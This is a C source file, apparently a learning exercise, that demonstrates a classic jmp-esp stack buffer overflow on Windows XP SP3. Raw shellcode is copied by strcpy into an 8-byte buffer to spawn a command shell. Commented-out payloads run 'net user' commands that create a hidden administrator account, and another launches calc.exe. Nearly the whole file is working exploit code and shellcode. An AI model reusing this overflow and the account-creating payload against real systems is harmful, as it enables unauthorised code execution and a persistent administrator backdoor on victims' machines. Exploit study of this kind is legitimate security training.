/*
  适用系统:windows xp sp3
  功能:基础jmp esp缓冲区溢出测试代码
*/

#include <stdio.h>
#include <string.h>

char name[] = "\x41\x41\x41\x41"
              "\x41\x41\x41\x41"
              "\x41\x41\x41\x41"
              "\x12\x45\xfa\x7f"

              // jump cmd
              "\x55\x8B\xEC\x33\xC0\x50\x50\x50"
              "\xC6\x45\xF4\x4D"
              "\xC6\x45\xF5\x53"
              "\xC6\x45\xF6\x56"
              "\xC6\x45\xF7\x43"
              "\xC6\x45\xF8\x52"
              "\xC6\x45\xF9\x54"
              "\xC6\x45\xFA\x2E"
              "\xC6\x45\xFB\x44"
              "\xC6\x45\xFC\x4C"
              "\xC6\x45\xFD\x4C"
              "\x8D\x45\xF4\x50\xBA\x7B\x1D\x80\x7C\xFF\xD2"
              "\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D"
              "\x89\x45\xF4\xB8\x61\x6E\x64\x2E"
              "\x89\x45\xF8\xB8\x63\x6F\x6D\x22"
              "\x89\x45\xFC\x33\xD2\x88\x55\xFF"
              "\x8D\x45\xF4\x50\xB8\xC7\x93\xBF\x77\xFF\xD0";

// create a user secuid0
/*
"\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xad\x23"
                                "\x86\x7c\xff\xd3\x31\xc0\x50\xbb\xfa\xca"
                                "\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63"
                                "\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20"
                                "\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x73"
                                "\x65\x63\x75\x69\x64\x30\x20\x6d\x30\x6e"
                                "\x6b\x20\x2f\x61\x64\x64\x20\x26\x26\x20"
                                "\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67"
                                "\x72\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e"
                                "\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20"
                                "\x73\x65\x63\x75\x69\x64\x30\x20\x2f\x61"
                                "\x64\x64\x00";
*/

// open calc.exe
/*
"\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x13\x53\xbb\xad\x23\x86\x7c"
"\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff"
"\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61\x6c\x63\x2e\x65"
"\x78\x65";
*/

int main() {
  char output[8];

  strcpy(output, name);

  for (int i = 0; i < 8 && output[i]; i++)

    printf("\\0x%x", output[i]);

  return 0;
}
